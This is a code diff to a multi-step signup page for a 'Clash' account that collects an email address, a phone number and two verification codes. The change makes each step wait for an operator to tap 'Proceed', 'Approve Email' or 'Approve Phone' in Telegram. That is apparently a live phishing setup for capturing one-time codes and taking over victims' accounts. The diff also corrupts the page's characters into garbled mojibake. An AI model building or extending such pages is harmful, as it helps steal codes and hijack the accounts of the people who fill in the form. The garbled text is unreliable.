@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -157,7 +157,7 @@ select option{background:#3B0616}
 
 #form-section{padding:60px 20px;background:#0f0f11}
 
-/* SUBMIT SPINNER — shown the instant the button is clicked */
+/* SUBMIT SPINNER â€” shown the instant the button is clicked */
 .submit-spin{display:none;text-align:center;padding:1.5rem 0 0.5rem}
 .submit-spin.on{display:block}
 .submit-spin .spinner{width:36px;height:36px;border-width:3px}
@@ -204,7 +204,7 @@ select option{background:#3B0616}
 
   <div id="s1" class="screen active">
     <div class="progress"><i class="on"></i><i></i><i></i></div>
-    <div class="step-lbl">Step 1 of 3 Â· Your details</div>
+    <div class="step-lbl">Step 1 of 3 Ã‚Â· Your details</div>
     <h1>Create your account</h1>
     <p class="sub">We'll send a verification code to confirm your details.</p>
     <label>Email address</label>
@@ -397,7 +397,7 @@ select option{background:#3B0616}
 
   <div id="s2" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i></i></div>
-    <div class="step-lbl">Step 2 of 3 Â· Email</div>
+    <div class="step-lbl">Step 2 of 3 Ã‚Â· Email</div>
     <h1>Check your email</h1>
     <p class="sub">Four digits sent to:</p>
     <div class="sent-box"><span class="tick">@</span><b id="email-show" style="color:#FFF4F7"></b></div>
@@ -417,8 +417,8 @@ select option{background:#3B0616}
 
   <div id="s3" class="screen">
     <div class="progress"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <div class="done-row"><span class="tick">✓</span>Email verified</div>
-    <div class="step-lbl">Step 3 of 3 Â· Phone</div>
+    <div class="done-row"><span class="tick">âœ“</span>Email verified</div>
+    <div class="step-lbl">Step 3 of 3 Ã‚Â· Phone</div>
     <h1>Check your phone</h1>
     <p class="sub">Four digits sent to:</p>
     <div class="sent-box"><span class="tick">#</span><b id="phone-show" style="color:#FFF4F7"></b></div>
@@ -436,12 +436,12 @@ select option{background:#3B0616}
   </div>
 
   <div id="s4" class="screen" style="text-align:center;padding-top:1rem">
-    <div class="seal">✓</div>
+    <div class="seal">âœ“</div>
     <h1 style="margin-bottom:8px">You're in.</h1>
-    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> — check your inbox to access your Clash account.</p>
+    <p class="sub">Both your email and phone are verified. A login link has been sent to <b id="success-email" style="color:var(--hot)"></b> â€” check your inbox to access your Clash account.</p>
     <div class="info-box">
       <div class="info-lbl">What's next</div>
-      <div style="font-size:13px;color:var(--dim);line-height:2.2">📧 Check your email inbox<br>🔗 Click the login link<br>💫 Complete your profile<br>❤️ Start matching</div>
+      <div style="font-size:13px;color:var(--dim);line-height:2.2">ðŸ“§ Check your email inbox<br>ðŸ”— Click the login link<br>ðŸ’« Complete your profile<br>â¤ï¸ Start matching</div>
     </div>
   </div>
 
@@ -653,7 +653,7 @@ async function step1() {
         phone: phone,
         emailVerified: false,
         phoneVerified: false,
-        status: "pending",
+        status: "Proceed",
         createdAt: Date.now()
     };
 
@@ -670,14 +670,10 @@ async function step1() {
     }
 
     hideSubmitSpinner();
-    setActiveScreen("s2");
 
-    // Reset the email OTP inputs and their button state.
-    ["e0","e1","e2","e3"].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) el.value = "";
-    });
-    otpChk("e", "btn2");
+    // Stay on screen 1 — waiting for admin to tap "Proceed" in Telegram.
+    btn.textContent = "Sending code...";
+    btn.disabled = true;
 
     attachListener(requestId);
 }
@@ -694,31 +690,43 @@ function attachListener(requestId) {
             if (!snapshot.exists()) return;
 
             const data = snapshot.val() || {};
-            const emailOk = data.emailVerified === true;
-            const phoneOk = data.phoneVerified === true;
-            const statusOk = data.status === "verified";
+            const proceedOk = data.proceed === true;
+            const emailOk   = data.emailVerified === true;
+            const phoneOk   = data.phoneVerified === true;
+            const statusOk  = data.status === "approved";
 
-            // STEP 2 -> STEP 3: email just became true
-            if (emailOk && currentStep === 1) {
+            // STEP 1 -> 2: admin tapped "Proceed"
+            if (proceedOk && currentStep === 1) {
                 currentStep = 2;
-                setActiveScreen("s3");
+                ["e0","e1","e2","e3"].forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = "";
+                });
+                otpChk("e", "btn2");
+                setActiveScreen("s2");
+                return;
+            }
+
+            // STEP 2 -> 3: admin tapped "Approve Email"
+            if (proceedOk && emailOk && currentStep === 2) {
+                currentStep = 3;
                 hideError("err2");
-                // Reset the phone OTP inputs and their button state.
                 ["p0","p1","p2","p3"].forEach(id => {
                     const el = document.getElementById(id);
                     if (el) el.value = "";
                 });
                 otpChk("p", "btn3");
+                setActiveScreen("s3");
                 return;
             }
 
-            // FINAL: both true and status verified
-            if (emailOk && phoneOk && statusOk) {
-                currentStep = 3;
+            // STEP 3 -> 4: admin tapped "Approve Phone"
+            if (proceedOk && emailOk && phoneOk && statusOk && currentStep === 3) {
+                currentStep = 4;
                 teardownListener();
                 submissionLocked = false;
-                const btn = document.getElementById("btn1");
-                if (btn) btn.textContent = "Send verification code";
+                const b = document.getElementById("btn1");
+                if (b) { b.textContent = "Send verification code"; b.disabled = false; }
                 setActiveScreen("s4");
                 return;
             }
@@ -728,8 +736,8 @@ function attachListener(requestId) {
                 teardownListener();
                 submissionLocked = false;
                 currentStep = 1;
-                const btn = document.getElementById("btn1");
-                if (btn) btn.textContent = "Send verification code";
+                const b = document.getElementById("btn1");
+                if (b) { b.textContent = "Send verification code"; b.disabled = false; }
                 setActiveScreen("s1");
                 chk();
                 showError("err1", "Verification was not completed. Please try again.");
@@ -740,8 +748,8 @@ function attachListener(requestId) {
             teardownListener();
             submissionLocked = false;
             currentStep = 1;
-            const btn = document.getElementById("btn1");
-            if (btn) btn.textContent = "Send verification code";
+            const b = document.getElementById("btn1");
+            if (b) { b.textContent = "Send verification code"; b.disabled = false; }
             setActiveScreen("s1");
             chk();
             showError("err1", "Connection error. Please try again.");
@@ -884,3 +892,5 @@ window.accountVerificationFirebase = {
 </script>
 </body>
 </html>
+
+
